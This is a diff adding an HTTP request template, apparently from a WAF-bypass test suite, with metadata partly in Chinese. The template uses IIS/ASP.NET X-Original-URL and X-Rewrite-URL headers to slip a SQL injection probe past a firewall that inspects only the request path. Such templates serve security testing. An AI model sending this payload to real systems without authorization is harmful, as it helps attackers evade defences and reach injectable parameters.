@@ -1,0 +1,15 @@
+# @name: IIS X-Original-URL 路径绕过
+# @tags: get,sqli,header,x-original-url,iis,aspnet,id,bypass
+# @color: violet
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: header_x_original_url
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: IIS/ASP.NET 的 X-Original-URL / X-Rewrite-URL 头让后端按该 URL 路由，WAF 仅检测请求行路径 /，形成路径与参数检测盲区（经典 IIS bypass）。
+GET / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+X-Original-URL: /?id=1'+and+'a'='a
+X-Rewrite-URL: /?id=1'+and+'a'='a
+
